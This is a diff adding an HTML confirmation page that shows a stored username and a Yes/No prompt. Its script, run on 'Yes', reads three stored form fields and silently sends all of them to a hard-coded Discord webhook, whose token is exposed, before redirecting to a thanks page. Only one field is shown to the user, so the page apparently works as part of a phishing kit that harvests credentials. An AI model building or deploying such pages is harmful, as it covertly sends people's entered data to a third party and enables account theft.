@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Confirm Field</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .confirmation {
+            display: inline-block;
+            padding: 20px;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            background-color: #fff;
+            text-align: left;
+        }
+
+        .confirmation h2 {
+            margin: 0;
+        }
+
+        .confirmation p {
+            margin: 10px 0;
+        }
+
+        .button-group {
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .button {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .yes-button {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        .yes-button:hover {
+            background-color: #45a049;
+        }
+
+        .no-button {
+            background-color: #f44336;
+            color: white;
+        }
+
+        .no-button:hover {
+            background-color: #e53935;
+        }
+    </style>
+    <script>
+        function sendToWebhookAndProceed() {
+            const webhookUrl = "https://discord.com/api/webhooks/1233847512427663482/RwEYhmr57xOhiRJKuZ5ZTTYMG6kXlRih0uTBlxKSczG6w765ErDd0s0uGe3NA91b-kxc"; // Replace with your Discord webhook URL
+            const field1 = localStorage.getItem("field1");
+            const field2 = localStorage.getItem("field2");
+            const field3 = localStorage.getItem("field3");
+
+            let content = `Information:\nField 1: ${field1}\nField 2: ${field2}`;
+            if (field3.trim() !== '') {
+                content += `\nField 3: ${field3}`;
+            }
+
+            const payload = {
+                content: content
+            };
+
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                // Proceed to thanks.html after sending
+                window.location.href = "thanks.html";
+            })
+            .catch(error => {
+                console.error("Error sending to Discord:", error);
+                // Proceed to thanks.html even if there's an error
+                window.location.href = "thanks.html";
+            });
+        }
+
+        function navigateToIndex() {
+            window.location.href = "index.html";
+        }
+
+        window.onload = function() {
+            const field1 = localStorage.getItem("field1");
+            const nameElement = document.getElementById("user-name");
+
+            if (field1) {
+                nameElement.textContent = field1;
+            } else {
+                nameElement.textContent = "Unknown";
+            }
+        }
+    </script>
+</head>
+<body>
+    <div class="confirmation">
+        <h2>Is this the correct information?</h2>
+        <p>Username: <span id="user-name"></span></p>
+
+        <div class="button-group">
+            <button class="button yes-button" onclick="sendToWebhookAndProceed()">Yes</button>
+            <button class="button no-button" onclick="navigateToIndex()">No</button>
+        </div>
+    </div>
+</body>
+</html>
